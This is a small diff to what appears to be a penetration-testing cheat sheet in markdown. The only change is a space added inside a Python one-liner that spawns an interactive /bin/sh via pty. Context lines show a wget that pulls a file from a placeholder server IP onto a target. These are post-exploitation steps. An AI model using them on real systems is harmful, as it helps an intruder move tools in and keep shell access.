@@ -85,7 +85,7 @@ $ wget http://<ip of the server>/<filename of the file you need transferred>
 $ bash i 
 ```
 ```
-$ python -c 'import pty;pty.spawn("/bin/sh")'
+$ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 ## Footprinting & Scanning
 
